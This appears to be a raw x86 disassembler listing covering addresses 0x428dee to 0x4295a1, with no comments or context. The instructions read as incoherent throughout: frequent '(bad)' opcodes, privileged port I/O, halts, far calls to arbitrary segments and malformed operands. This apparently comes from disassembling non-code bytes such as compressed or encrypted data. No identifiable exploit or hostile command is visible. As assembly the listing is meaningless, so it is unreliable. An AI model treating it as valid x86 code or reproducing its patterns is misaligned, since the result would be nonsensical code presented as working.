  428dee:	les    eax,FWORD PTR [eax]
  428df0:	sub    cl,dh
  428df2:	out    dx,al
  428df3:	loop   0x428df7
  428df5:	xor    al,0xcb
  428df7:	ins    DWORD PTR es:[edi],dx
  428df8:	mov    ecx,eax
  428dfa:	dec    edi
  428dfb:	mov    bh,BYTE PTR [ecx+0x8]
  428dfe:	mov    dl,0x11
  428e00:	enter  0x9bbf,0x12
  428e04:	arpl   WORD PTR [edx+eiz*2+0x4],di
  428e08:	arpl   WORD PTR [edi],di
  428e0a:	sbb    al,BYTE PTR [edi-0xe]
  428e0d:	(bad)  
  428e0e:	and    al,0xbe
  428e10:	hlt    
  428e11:	pop    ss
  428e12:	and    eax,0xa62d637c
  428e17:	call   0x7f60:0xaf51a216
  428e1e:	xor    al,0x80
  428e20:	dec    eax
  428e21:	cmp    al,0x86
  428e23:	and    ah,BYTE PTR ds:0x9766e5fe
  428e29:	sar    BYTE PTR [ebp+0x4468d183],1
  428e2f:	inc    ebx
  428e30:	jo     0x428e87
  428e32:	out    dx,eax
  428e33:	scas   al,BYTE PTR es:[edi]
  428e34:	lds    eax,FWORD PTR [ebx]
  428e36:	lods   al,BYTE PTR ds:[esi]
  428e37:	adc    bh,BYTE PTR [edx-0x52]
  428e3a:	push   cs
  428e3b:	pop    es
  428e3c:	mov    al,0x27
  428e3e:	lahf   
  428e3f:	ret    0xda5b
  428e42:	out    0xf0,eax
  428e44:	loope  0x428e2c
  428e46:	outs   dx,BYTE PTR ds:[esi]
  428e47:	cmp    al,0xdf
  428e49:	mov    bh,0xf1
  428e4b:	mov    bh,cl
  428e4d:	and    BYTE PTR [esi],dh
  428e4f:	push   ss
  428e50:	mov    ebp,DWORD PTR [eax-0x4d27ed3c]
  428e56:	push   esp
  428e57:	xchg   ecx,eax
  428e58:	stos   DWORD PTR es:[edi],eax
  428e59:	adc    BYTE PTR [ecx-0xa64e58a],bh
  428e5f:	cs ret 0x8dfc
  428e63:	fcmovb st,st(4)
  428e65:	dec    esi
  428e66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e67:	xchg   BYTE PTR [ebx-0x2738d564],bl
  428e6d:	inc    esp
  428e6e:	bound  esp,QWORD PTR [esp+ecx*4]
  428e71:	nop
  428e72:	adc    eax,DWORD PTR [eax-0x6d]
  428e75:	mov    edx,0x39fbda85
  428e7a:	ds pop ds
  428e7c:	jecxz  0x428e38
  428e7e:	xchg   BYTE PTR [ebx-0x44],bl
  428e81:	push   edi
  428e82:	cmp    cl,BYTE PTR [edx-0x25df263d]
  428e88:	ins    DWORD PTR es:[edi],dx
  428e89:	push   ebp
  428e8a:	sub    al,0xb3
  428e8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e8d:	sbb    esp,DWORD PTR [esp+edi*4-0x3a]
  428e91:	push   0xffffffe0
  428e93:	int3   
  428e94:	(bad)  
  428e96:	jbe    0x428eb1
  428e98:	sub    BYTE PTR [ecx-0x7b],ch
  428e9b:	mov    ebp,0x682dfde9
  428ea0:	test   al,0x0
  428ea2:	fisttp WORD PTR [eax+0x6de6f0d5]
  428ea8:	stos   BYTE PTR es:[edi],al
  428ea9:	pop    es
  428eaa:	xor    eax,0xb0e4518f
  428eaf:	mov    bl,0x4e
  428eb1:	xor    BYTE PTR [edi+esi*1+0x32],0xeb
  428eb6:	adc    al,0xa
  428eb8:	loope  0x428ec5
  428eba:	mov    cl,0x48
  428ebc:	sahf   
  428ebd:	xor    DWORD PTR [ecx+ecx*1-0x6a],0x129d7214
  428ec5:	jl     0x428eef
  428ec7:	mov    ds:0x320d16bd,al
  428ecc:	jb     0x428ea3
  428ece:	fldenv [edi+0x55dfbd43]
  428ed4:	leave  
  428ed5:	push   edx
  428ed6:	dec    esi
  428ed7:	pop    ds
  428ed8:	ror    DWORD PTR [eax+0x0],1
  428edb:	loope  0x428f21
  428edd:	bswap  edi
  428edf:	sbb    eax,0x1d4f7eef
  428ee4:	add    al,0x53
  428ee6:	xchg   ebp,eax
  428ee7:	push   ebx
  428ee8:	xlat   BYTE PTR ds:[ebx]
  428ee9:	cmp    al,0x4b
  428eeb:	dec    edx
  428eec:	mov    ebp,0xc9bb9b8a
  428ef1:	sbb    DWORD PTR [edi+0x49],0xc2235121
  428ef8:	push   edx
  428ef9:	test   eax,0xabb2ddc2
  428efe:	jg     0x428eab
  428f00:	add    al,0xc2
  428f02:	adc    DWORD PTR [edi+0x6e],ebp
  428f05:	(bad)  
  428f07:	add    ch,BYTE PTR [edi]
  428f09:	hlt    
  428f0a:	ja     0x428ece
  428f0c:	pop    edi
  428f0d:	push   ecx
  428f0e:	pop    es
  428f0f:	jp     0x428f01
  428f11:	push   ebx
  428f12:	bound  ecx,QWORD PTR [ebx-0x10]
  428f15:	sub    esp,DWORD PTR [ecx+0x49]
  428f18:	ror    DWORD PTR [edi],0x61
  428f1b:	push   cs
  428f1c:	xchg   edx,eax
  428f1d:	cmp    al,0x65
  428f1f:	jbe    0x428eaa
  428f21:	sbb    dl,BYTE PTR [esi+0x9]
  428f24:	pop    esp
  428f25:	outs   dx,DWORD PTR ds:[esi]
  428f26:	ins    BYTE PTR es:[edi],dx
  428f27:	add    BYTE PTR [eax],0x24
  428f2a:	sbb    edx,ebp
  428f2c:	sub    eax,0xc2219f09
  428f31:	arpl   WORD PTR [edx],ax
  428f33:	jg     0x428f6b
  428f35:	xor    cl,BYTE PTR [esi-0x6c]
  428f38:	fadd   st,st(7)
  428f3a:	add    edx,DWORD PTR [edi]
  428f3c:	or     esi,DWORD PTR [eax-0x7055f64d]
  428f42:	jge    0x428f20
  428f44:	push   ds
  428f45:	out    dx,al
  428f46:	loope  0x428eff
  428f48:	jns    0x428f70
  428f4a:	ficomp WORD PTR ds:0xa7776148
  428f50:	(bad)  
  428f51:	std    
  428f52:	fs (bad) 
  428f54:	daa    
  428f55:	mov    dl,0x61
  428f57:	pushf  
  428f58:	ins    DWORD PTR es:[edi],dx
  428f59:	div    BYTE PTR [ecx+0xb]
  428f5c:	rcr    ebp,1
  428f5e:	ret    
  428f5f:	in     eax,0x1e
  428f61:	push   0x44
  428f63:	cwde   
  428f64:	aas    
  428f65:	jae    0x428f97
  428f67:	and    edi,0xffffff8a
  428f6a:	adc    DWORD PTR [edx-0x5],0x2a
  428f6e:	arpl   sp,si
  428f70:	fnstenv [edx-0x79]
  428f73:	imul   ecx
  428f75:	arpl   WORD PTR [ebp-0x2677617d],dx
  428f7b:	mov    eax,0xfa47503f
  428f80:	ins    DWORD PTR es:[edi],dx
  428f81:	push   edi
  428f82:	mov    ds:0x7f46d8bf,eax
  428f87:	mov    ebp,0xe77c2f8d
  428f8c:	mov    esp,0x13620f3e
  428f91:	pop    edx
  428f92:	ret    
  428f93:	into   
  428f94:	call   0xa319:0x5a1aa219
  428f9b:	das    
  428f9c:	sbb    BYTE PTR [ecx],0xdd
  428f9f:	and    al,0xfa
  428fa1:	call   FWORD PTR [eax]
  428fa3:	cld    
  428fa4:	push   edx
  428fa5:	inc    edi
  428fa6:	jmp    0x8f94:0x7f9ce2a1
  428fad:	dec    ebx
  428fae:	aaa    
  428faf:	add    edi,DWORD PTR [ebx+0x7202e09e]
  428fb5:	out    0xb,al
  428fb7:	xlat   BYTE PTR ds:[ebx]
  428fb8:	adc    ah,al
  428fba:	fcmovnbe st,st(3)
  428fbc:	sbb    BYTE PTR [ebx+0xb],dh
  428fbf:	sub    BYTE PTR [edi],dl
  428fc1:	or     BYTE PTR [ebp+0x6b82167b],al
  428fc7:	sbb    eax,0xeb6ee438
  428fcc:	pop    esp
  428fcd:	leave  
  428fce:	das    
  428fcf:	adc    eax,DWORD PTR [esi+0x7f]
  428fd2:	cwde   
  428fd3:	xchg   ebx,eax
  428fd4:	cmp    BYTE PTR [edx+0x7d],al
  428fd7:	jns    0x42904d
  428fd9:	jb     0x428fdf
  428fdb:	iret   
  428fdc:	mov    dh,0x42
  428fde:	mov    edx,0xcb936869
  428fe3:	mov    esp,0xefc41227
  428fe8:	pop    esi
  428fe9:	cmp    BYTE PTR [edi-0x20fbb373],cl
  428fef:	mov    WORD PTR [ebp-0x1ef62390],es
  428ff5:	xlat   BYTE PTR ds:[ebx]
  428ff6:	sbb    BYTE PTR ds:0x89286afc,0x31
  428ffd:	push   cs
  428ffe:	in     al,0x27
  429000:	sti    
  429001:	adc    eax,0x70b5615c
  429006:	mov    WORD PTR [ebx],?
  429008:	push   ebp
  429009:	das    
  42900a:	push   cs
  42900b:	push   esp
  42900c:	add    BYTE PTR [ecx-0x80],ch
  42900f:	push   eax
  429010:	xor    BYTE PTR [ebx+ebx*4-0x2b76bfc0],ah
  429017:	repnz (bad) 
  429019:	jl     0x429016
  42901b:	add    BYTE PTR [ecx-0x6335a9b0],bl
  429021:	ins    DWORD PTR es:[edi],dx
  429022:	out    0xae,eax
  429024:	xchg   ebx,eax
  429025:	or     bh,ch
  429027:	mov    bl,dl
  429029:	sub    BYTE PTR [edx+edi*2+0x693fa31c],bh
  429030:	jecxz  0x42901e
  429032:	mov    cl,0x34
  429034:	ds clc 
  429036:	mov    DWORD PTR [ebp+0x4c],esi
  429039:	and    al,0xe2
  42903b:	cmp    BYTE PTR [ebp-0x58],bl
  42903e:	loope  0x429030
  429040:	or     al,BYTE PTR fs:[edi+0x9]
  429044:	ret    
  429045:	mov    edi,0x78b797d
  42904a:	cdq    
  42904b:	call   0x5d257df5
  429050:	lods   eax,DWORD PTR ds:[esi]
  429051:	test   eax,0x9c43b773
  429056:	shl    DWORD PTR [ecx+eiz*4],cl
  429059:	fst    DWORD PTR [edx+ebp*2-0xfcbb696]
  429060:	xor    bl,BYTE PTR [esi-0x19]
  429063:	mov    ds,WORD PTR [ebx]
  429065:	inc    esi
  429066:	adc    BYTE PTR [esi+0x7e],bh
  429069:	adc    eax,0xc5ee495f
  42906e:	ins    DWORD PTR es:[edi],dx
  42906f:	add    DWORD PTR [ebp+0x1c],0x44f1b2db
  429076:	and    al,ch
  429078:	jnp    0x429028
  42907a:	and    DWORD PTR ds:0x7f6ce2eb,edx
  429080:	add    ch,ch
  429082:	push   eax
  429083:	sbb    cl,dl
  429085:	sbb    BYTE PTR [esi+0x70e2ae52],bh
  42908b:	ds inc esi
  42908d:	mov    ebp,0x7b6b8ab8
  429092:	dec    ebp
  429093:	je     0x429017
  429095:	test   BYTE PTR [edx+ebp*1+0xf],dh
  429099:	call   0x2b8b:0xa352e307
  4290a0:	xor    al,BYTE PTR [ecx+0x4d]
  4290a3:	in     al,0xcf
  4290a5:	xchg   esi,eax
  4290a6:	sbb    bl,BYTE PTR [eax]
  4290a8:	jae    0x429106
  4290aa:	add    al,0x53
  4290ac:	adc    DWORD PTR [ecx+ecx*8],ebx
  4290af:	test   al,0xb6
  4290b1:	in     al,dx
  4290b2:	stos   BYTE PTR es:[edi],al
  4290b3:	jl     0x429049
  4290b5:	retf   0xef1d
  4290b8:	loope  0x429090
  4290ba:	outs   dx,BYTE PTR ds:[esi]
  4290bb:	or     eax,0xbfb5cfa7
  4290c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290c1:	inc    ecx
  4290c2:	test   BYTE PTR [edx+eax*4+0x2d],dl
  4290c6:	ret    0xacf
  4290c9:	adc    al,0xff
  4290cb:	jbe    0x4290ac
  4290cd:	cmp    ebx,DWORD PTR [edx+eax*1-0x5c09daf7]
  4290d4:	push   es
  4290d5:	aas    
  4290d6:	in     al,dx
  4290d7:	mov    ch,0x9
  4290d9:	(bad)  
  4290db:	daa    
  4290dc:	jno    0x4290f1
  4290de:	or     BYTE PTR [edi-0x1c8d33f6],0x62
  4290e5:	adc    al,0x13
  4290e7:	jne    0x429153
  4290e9:	aam    0xfb
  4290eb:	lods   eax,DWORD PTR ds:[esi]
  4290ec:	xor    cl,BYTE PTR [eax+0x28d1ecfd]
  4290f2:	cli    
  4290f3:	push   edi
  4290f4:	gs mov cl,0xf1
  4290f7:	cmc    
  4290f8:	dec    ebp
  4290f9:	adc    BYTE PTR [edx+eiz*1],ch
  4290fc:	cmp    eax,0xdc8d4016
  429101:	sub    DWORD PTR [ebx+0x1d],ecx
  429104:	ss call 0x47c:0xa73be3ef
  42910c:	bound  esi,QWORD PTR [esi+0x5b]
  42910f:	xchg   edx,eax
  429110:	sti    
  429111:	sub    bh,BYTE PTR [ebx-0x1f20e92d]
  429117:	xor    DWORD PTR [edx+0x78],eax
  42911a:	cmp    BYTE PTR [edx],0xb1
  42911d:	popf   
  42911e:	(bad)  
  42911f:	mov    ah,0x6b
  429121:	popa   
  429122:	imul   ebp,DWORD PTR [ebx+0x6ddbbb8e],0xffffffad
  429129:	ret    
  42912a:	or     dh,BYTE PTR [ebx]
  42912c:	push   edx
  42912d:	inc    ecx
  42912e:	push   esi
  42912f:	stos   BYTE PTR es:[edi],al
  429130:	out    0x9e,al
  429132:	retf   0x3c0e
  429135:	or     edi,DWORD PTR [edi]
  429137:	sub    edx,ecx
  429139:	ins    BYTE PTR es:[edi],dx
  42913a:	push   ds
  42913b:	sub    eax,DWORD PTR [ebp-0x3d119bbf]
  429141:	shl    BYTE PTR [edi+eax*2],0x40
  429145:	into   
  429146:	mov    ss,esp
  429148:	mov    esi,0x59a17714
  42914d:	dec    esp
  42914e:	add    al,0xf0
  429150:	imul   eax,DWORD PTR [ecx],0xffffff88
  429153:	inc    edi
  429154:	inc    ebp
  429155:	fsubr  st(5),st
  429157:	add    BYTE PTR [edx],0x7e
  42915a:	cmp    BYTE PTR [ecx],dh
  42915c:	pusha  
  42915d:	mov    dl,dh
  42915f:	mov    ds:0xd49a987f,eax
  429164:	stc    
  429165:	and    ebx,DWORD PTR [edi]
  429167:	mov    eax,ds:0x6c85c830
  42916c:	dec    esp
  42916d:	mov    bl,0xfc
  429170:	lods   eax,DWORD PTR ds:[esi]
  429171:	sbb    edi,0xffffffdb
  429174:	adc    eax,DWORD PTR [ebp-0x10]
  429177:	bound  edx,QWORD PTR [ebx]
  429179:	xchg   edi,eax
  42917a:	sub    DWORD PTR [esi+edi*8-0x67],ebp
  42917e:	sub    ah,BYTE PTR [ebx+0x3e]
  429181:	push   ds
  429182:	shl    BYTE PTR [ecx],0xd2
  429185:	push   ecx
  429186:	sahf   
  429187:	addr16 jmp 0x429184
  42918a:	leave  
  42918b:	sub    BYTE PTR [esi],bh
  42918d:	jb     0x42914d
  42918f:	mov    bh,ch
  429191:	aam    0x75
  429193:	push   esp
  429194:	jns    0x42918a
  429196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429197:	inc    esi
  429198:	adc    BYTE PTR [ebx-0x5b274dba],bh
  42919e:	hlt    
  42919f:	dec    edi
  4291a0:	icebp  
  4291a1:	mov    ds:0x8d7ff70e,al
  4291a6:	stos   BYTE PTR es:[edi],al
  4291a7:	test   BYTE PTR [ebx],0xf1
  4291aa:	push   es
  4291ab:	adc    ch,BYTE PTR [edi-0x45]
  4291ae:	push   es
  4291af:	mov    ebp,0xa99424e3
  4291b4:	add    al,0xbe
  4291b6:	lock leave 
  4291b8:	jecxz  0x4291d4
  4291ba:	adc    eax,0x24b47a49
  4291bf:	add    cl,BYTE PTR [ecx-0x57f3afdf]
  4291c5:	push   esi
  4291c6:	pop    esi
  4291c7:	(bad)  [edi+esi*2+0x3291b876]
  4291ce:	leave  
  4291cf:	xchg   edx,eax
  4291d0:	cmc    
  4291d1:	ss out dx,al
  4291d3:	adc    DWORD PTR [edx+0x9bc7704],ecx
  4291d9:	ficomp WORD PTR [edi]
  4291db:	xchg   esi,eax
  4291dc:	adc    dl,BYTE PTR [eax+0x69336a16]
  4291e2:	sub    al,0x6c
  4291e4:	test   BYTE PTR [eax],dh
  4291e6:	mov    ebp,0xee45c355
  4291eb:	les    ebp,FWORD PTR [eax]
  4291ed:	jno    0x429248
  4291ef:	mov    ch,0xc2
  4291f1:	add    ecx,edx
  4291f3:	xchg   ebp,eax
  4291f4:	stc    
  4291f5:	xor    ecx,DWORD PTR [edx+0x2f]
  4291f8:	push   0xffffffd4
  4291fa:	clc    
  4291fb:	fadd   QWORD PTR [esi]
  4291fd:	loope  0x42920b
  4291ff:	mov    eax,ds:0xc718337e
  429204:	adc    eax,0xd4122cb9
  429209:	mov    eax,ds:0x7843374f
  42920e:	iret   
  42920f:	loop   0x42919c
  429211:	js     0x429288
  429213:	mov    al,ds:0xdaafcb83
  429218:	(bad)  
  429219:	dec    edi
  42921a:	cmp    al,0xbd
  42921c:	xchg   BYTE PTR [edi+0x1b],al
  42921f:	add    DWORD PTR [esi+edx*4-0x12a41ed8],edi
  429226:	xor    BYTE PTR [esi-0x36],ch
  429229:	test   ecx,esi
  42922b:	imul   BYTE PTR [esi+0x11]
  42922e:	fst    DWORD PTR [esi+0x1b]
  429231:	(bad)  
  429232:	push   esp
  429233:	loope  0x4291b8
  429235:	or     dh,BYTE PTR [esi+0xd248103]
  42923b:	pop    eax
  42923c:	rcr    BYTE PTR [edi-0x5b],cl
  42923f:	sub    DWORD PTR [esi-0x60003840],esp
  429245:	lods   eax,DWORD PTR ds:[esi]
  429246:	test   DWORD PTR [eax],0xceaeeb93
  42924c:	(bad)  
  42924d:	fistp  QWORD PTR [ebx]
  42924f:	mov    ebp,0xded99df7
  429254:	push   edi
  429255:	shr    BYTE PTR [edx-0x2b],cl
  429258:	lods   al,BYTE PTR ds:[esi]
  429259:	push   0x4b
  42925b:	mov    dl,0x6c
  42925d:	fst    DWORD PTR [esi-0x4ff23e8f]
  429263:	sbb    eax,0x1090e843
  429268:	dec    edx
  429269:	and    BYTE PTR [edi-0x80],bl
  42926c:	adc    BYTE PTR [eax],ah
  42926e:	dec    edi
  42926f:	clc    
  429270:	daa    
  429271:	add    DWORD PTR [esi+0x50982010],edi
  429277:	or     al,0x1
  429279:	dec    esp
  42927a:	xchg   eax,ebx
  42927c:	mov    cs,WORD PTR [ebx]
  42927e:	add    al,BYTE PTR [ebx+0x5926e49b]
  429284:	pop    ebp
  429285:	push   esi
  429286:	xchg   edi,eax
  429287:	mov    dh,0xf7
  429289:	ss mov ebx,0xdccfbd3b
  42928f:	sti    
  429290:	popf   
  429291:	(bad)  
  429293:	jnp    0x42928b
  429295:	pop    esi
  429296:	icebp  
  429297:	cld    
  429298:	cmc    
  429299:	cmp    al,0xf3
  42929b:	in     al,dx
  42929c:	push   0x76
  42929e:	out    0xde,al
  4292a0:	sti    
  4292a1:	imul   esp,edi,0xffffffbc
  4292a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292a5:	mov    ebp,0xd254c787
  4292aa:	mov    ah,0x92
  4292ac:	xchg   ecx,eax
  4292ad:	mov    ebp,0xc49b8b86
  4292b2:	or     BYTE PTR [ecx-0x5887984],0x8
  4292b9:	jns    0x429273
  4292bb:	call   0x465611b9
  4292c0:	xor    eax,0x4fe9c65e
  4292c5:	gs lock jae 0x429284
  4292c9:	pop    ss
  4292ca:	imul   DWORD PTR [ebp+0x487340eb]
  4292d0:	cmp    al,0xb3
  4292d2:	movq   mm4,mm5
  4292d5:	pop    edi
  4292d6:	inc    esp
  4292d7:	mov    gs,WORD PTR [edi+esi*4+0x43]
  4292db:	arpl   WORD PTR [ebx-0x3a5d6b96],dx
  4292e1:	jmp    0x4292a7
  4292e3:	jo     0x429317
  4292e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292e6:	mov    dl,0xb8
  4292e8:	fsubr  QWORD PTR [edx-0x6a]
  4292eb:	jo     0x42933e
  4292ed:	in     al,0xfc
  4292ef:	pop    ebx
  4292f0:	leave  
  4292f1:	outs   dx,DWORD PTR ds:[esi]
  4292f3:	or     ah,bl
  4292f5:	std    
  4292f6:	push   edi
  4292f7:	cs loopne 0x4292cb
  4292fa:	pusha  
  4292fb:	das    
  4292fc:	sbb    cl,BYTE PTR [ecx-0x70]
  4292ff:	mov    ch,0x9b
  429301:	xchg   ebx,eax
  429302:	cmp    BYTE PTR [ecx],dl
  429304:	call   0xc55d1cab
  429309:	cmp    al,0x99
  42930b:	cmp    al,0x23
  42930d:	xor    al,0xe6
  42930f:	xchg   ecx,eax
  429310:	mov    dl,0x17
  429312:	into   
  429313:	inc    eax
  429314:	or     BYTE PTR [esi-0x55],dl
  429317:	test   DWORD PTR [esi],esi
  429319:	cdq    
  42931a:	and    BYTE PTR [esi],0xd1
  42931d:	aas    
  42931e:	and    DWORD PTR [edi-0x80],ebx
  429321:	mov    bh,0x92
  429323:	daa    
  429324:	sub    BYTE PTR [ebx+eax*8],ch
  429327:	sub    eax,0x5aa076a
  42932c:	in     al,0x49
  42932e:	fdiv   DWORD PTR [ebx+edi*8-0x694d9734]
  429335:	lock mov BYTE PTR [ecx+edx*2-0x1b],0x7f
  42933b:	mov    ebx,0x703d1b6
  429340:	or     DWORD PTR [ebx],ebx
  429342:	inc    ecx
  429343:	or     eax,0xd1945235
  429348:	dec    ecx
  429349:	push   eax
  42934a:	test   DWORD PTR [ebx+0xc4e02e6],0x23fc5714
  429354:	int3   
  429355:	xchg   edx,eax
  429356:	int3   
  429357:	xor    edi,ebx
  429359:	inc    ebp
  42935a:	call   0x77f0c22d
  42935f:	addr16 push esp
  429361:	fs int3 
  429363:	mov    BYTE PTR [ebx+0x19],dh
  429366:	out    0x8e,al
  429368:	adc    eax,edx
  42936a:	int3   
  42936b:	ror    BYTE PTR [ebx-0x30042781],1
  429371:	and    eax,0x28f646b5
  429376:	mov    esi,0xf8c4871e
  42937b:	and    BYTE PTR [eax],cl
  42937d:	popa   
  42937e:	lock test eax,0xedd80e0d
  429384:	or     ah,BYTE PTR [ecx+eax*2]
  429387:	add    dh,BYTE PTR [eax]
  429389:	inc    eax
  42938a:	sti    
  42938b:	and    BYTE PTR [esi],0xdd
  42938e:	pop    edx
  42938f:	scas   eax,DWORD PTR es:[edi]
  429390:	pusha  
  429391:	in     al,0x2
  429393:	sbb    eax,0xd9ab85ce
  429398:	ja     0x429327
  42939a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42939b:	xor    al,0x26
  42939d:	ins    DWORD PTR es:[edi],dx
  42939e:	mov    edi,0x188b591
  4293a3:	xor    ah,BYTE PTR [ebx]
  4293a5:	fnsave [esi+edx*8]
  4293a8:	ret    
  4293a9:	jne    0x429419
  4293ab:	pop    esp
  4293ac:	and    al,0x5
  4293ae:	mov    dl,0xcd
  4293b0:	ins    BYTE PTR es:[edi],dx
  4293b1:	(bad)  
  4293b2:	mov    ?,WORD PTR [ecx+eiz*4]
  4293b5:	sahf   
  4293b6:	mov    ecx,0x9755b60c
  4293bb:	xlat   BYTE PTR ds:[ebx]
  4293bc:	ja     0x429344
  4293be:	(bad)  
  4293bf:	ficom  WORD PTR [ebp+0x5d]
  4293c2:	dec    esi
  4293c3:	and    esi,esp
  4293c5:	jb     0x42941f
  4293c7:	inc    esi
  4293c8:	inc    ecx
  4293c9:	int3   
  4293ca:	adc    ah,cl
  4293cc:	add    al,0x29
  4293ce:	mov    dl,0x61
  4293d0:	push   ds
  4293d1:	cwde   
  4293d2:	adc    DWORD PTR [eax+0x4989d8b],ebx
  4293d8:	aad    0xab
  4293da:	mov    ebp,0x4cdd0737
  4293df:	xor    al,BYTE PTR [esi-0x373f4701]
  4293e5:	enter  0xdc8e,0x60
  4293e9:	js     0x4293c8
  4293eb:	lods   eax,DWORD PTR ds:[esi]
  4293ec:	or     DWORD PTR [eax-0x2aa74cf],eax
  4293f2:	jb     0x42942d
  4293f4:	out    0xc6,al
  4293f6:	mov    ebx,ss
  4293f8:	mov    ds,WORD PTR [edi+0x4e]
  4293fb:	addr16 jno 0x42946b
  4293fe:	aam    0x89
  429400:	dec    BYTE PTR [esp+ecx*4+0x7eded1c]
  429407:	fwait
  429408:	ins    DWORD PTR es:[edi],dx
  429409:	sbb    BYTE PTR [eax],dl
  42940b:	aad    0xa4
  42940d:	xor    eax,0x132143da
  429412:	jle    0x429447
  429414:	push   ebx
  429415:	inc    ebp
  429416:	test   BYTE PTR [ebx+eiz*8+0x68],cl
  42941a:	push   eax
  42941b:	(bad)  
  42941c:	std    
  42941d:	gs inc edx
  42941f:	mov    dl,BYTE PTR ds:0x54c9f8f4
  429425:	xor    bl,cl
  429427:	mov    al,0xb1
  429429:	mov    ecx,0x668f2f0e
  42942e:	shl    esp,1
  429430:	jae    0x4293d3
  429432:	pop    edx
  429433:	scas   al,BYTE PTR es:[edi]
  429434:	and    ch,BYTE PTR ds:0x95082678
  42943a:	jle    0x4293fb
  42943c:	cdq    
  42943d:	dec    esp
  42943e:	in     eax,dx
  42943f:	test   eax,0x92365405
  429444:	mov    eax,0x99f1f324
  429449:	aas    
  42944a:	pop    ebp
  42944b:	pop    esi
  42944c:	mov    DWORD PTR [edx],eax
  42944e:	mov    WORD PTR [ecx-0x51],es
  429451:	adc    ah,ch
  429453:	sub    cl,cl
  429455:	adc    eax,0x90cfa027
  42945a:	or     ah,al
  42945c:	pop    esi
  42945d:	je     0x4294d5
  42945f:	push   0x18
  429461:	push   ebx
  429462:	cmp    eax,DWORD PTR [ebp+0xed66e14]
  429468:	int3   
  429469:	jbe    0x42945c
  42946b:	cmp    ebp,DWORD PTR [ebp+0x9c1b96c]
  429471:	cmp    DWORD PTR [ebx],ebp
  429473:	arpl   WORD PTR [esi+ecx*2-0x70c98f86],bx
  42947a:	xor    cl,BYTE PTR [ecx-0x58]
  42947d:	lds    eax,FWORD PTR [edx+0xd]
  429480:	push   ds
  429481:	adc    ch,BYTE PTR [ecx]
  429483:	and    esp,DWORD PTR [ecx+ecx*4]
  429486:	repz popa 
  429488:	xchg   ecx,eax
  429489:	mov    ds:0x56ca436e,eax
  42948e:	xchg   DWORD PTR [ebx+0x1c14034],esi
  429494:	sub    dl,ah
  429496:	out    0x5b,al
  429498:	sbb    al,BYTE PTR [ebx]
  42949a:	cmp    BYTE PTR [ebp+0x4f],cl
  42949d:	repnz mov ecx,0xe4b80bf1
  4294a3:	and    BYTE PTR [ebx+0x27],bl
  4294a6:	in     al,dx
  4294a7:	test   BYTE PTR [ebx-0x70],al
  4294aa:	inc    edx
  4294ab:	dec    esi
  4294ac:	dec    ebp
  4294ad:	arpl   WORD PTR [esi+eax*1+0x685369d9],cx
  4294b4:	ror    BYTE PTR [ebp+0x68],cl
  4294b7:	repz (bad) 
  4294ba:	adc    DWORD PTR [esi+0x2b],0xe4718bec
  4294c1:	sar    WORD PTR [eax],cl
  4294c4:	xlat   BYTE PTR ds:[ebx]
  4294c5:	pop    edi
  4294c6:	pop    ebx
  4294c7:	dec    ecx
  4294c8:	jbe    0x429463
  4294ca:	rol    BYTE PTR [esi],1
  4294cc:	ret    
  4294cd:	xchg   edx,eax
  4294ce:	int    0xe8
  4294d0:	mov    esp,0xc30e0761
  4294d5:	cmp    bl,dh
  4294d7:	enter  0x41bc,0x23
  4294db:	xchg   ch,cl
  4294dd:	stc    
  4294de:	adc    bl,0x8a
  4294e1:	push   ss
  4294e2:	cmp    bh,ah
  4294e4:	fisubr WORD PTR [ebp-0x1f00b7ca]
  4294ea:	rol    edx,0x77
  4294ed:	mov    bl,0x28
  4294ef:	cmp    al,0x5d
  4294f1:	inc    eax
  4294f2:	ret    
  4294f3:	out    0x7c,eax
  4294f5:	mov    al,0xbe
  4294f7:	stos   DWORD PTR es:[edi],eax
  4294f8:	adc    edi,ecx
  4294fa:	jle    0x4294d2
  4294fc:	dec    ebp
  4294fd:	pop    es
  4294fe:	popf   
  4294ff:	and    ecx,DWORD PTR ss:[ecx-0x14]
  429503:	sbb    DWORD PTR [edx-0x3879584a],edx
  429509:	xchg   ecx,eax
  42950a:	es xor al,0x73
  42950d:	jnp    0x42957a
  42950f:	sbb    BYTE PTR [edi-0x63fbbaed],dl
  429515:	cs xchg ebp,eax
  429517:	mov    ah,0x23
  429519:	dec    ebp
  42951a:	inc    cx
  42951c:	mov    BYTE PTR [ebp+esi*8-0x3de5bf1],dh
  429523:	ret    
  429524:	ins    BYTE PTR es:[edi],dx
  429525:	and    esi,DWORD PTR [esi+0x2ab08437]
  42952b:	cmp    ecx,DWORD PTR [edx-0x4bc12e7d]
  429531:	push   es
  429532:	stos   DWORD PTR es:[edi],eax
  429533:	mov    al,0x97
  429535:	(bad)  
  429536:	jo     0x429528
  429538:	rol    BYTE PTR [edx],cl
  42953a:	pop    esi
  42953b:	dec    edi
  42953c:	mov    edx,0x70393710
  429541:	retf   
  429542:	jmp    0xed04:0x5024c80e
  429549:	or     DWORD PTR [ebp+0x95ad65e],0x5a4132de
  429553:	mov    BYTE PTR [edx+0x6da8291],ah
  429559:	cmp    ebp,eax
  42955b:	xor    DWORD PTR [ecx-0x6f],esp
  42955e:	push   esi
  42955f:	push   0x20
  429561:	xchg   ecx,eax
  429562:	(bad)  
  429563:	adc    al,0x9
  429565:	aam    0xa8
  429567:	fisttp DWORD PTR [edi+ebx*4]
  42956a:	aad    0x8e
  42956c:	or     al,0xd9
  42956e:	ror    BYTE PTR [ebp+0x748dd734],cl
  429574:	test   al,0x3a
  429576:	dec    eax
  429577:	pusha  
  429578:	ins    BYTE PTR es:[edi],dx
  429579:	into   
  42957a:	gs lock cli 
  42957d:	inc    eax
  42957e:	inc    ebp
  42957f:	xchg   ebp,eax
  429580:	clc    
  429581:	sbb    al,0x22
  429583:	in     eax,0xa2
  429585:	and    BYTE PTR [esi-0x5ba4e507],cl
  42958b:	push   ebp
  42958c:	mov    ch,0xcd
  42958e:	push   0x64
  429590:	mov    esi,0x319f0c51
  429595:	jb     0x42957a
  429597:	xor    DWORD PTR [esp+ecx*1+0x69],esp
  42959b:	out    dx,eax
  42959c:	mov    cl,0xdd
  42959e:	int3   
  42959f:	and    DWORD PTR [ecx],esi
  4295a1:	jbe    0x429551
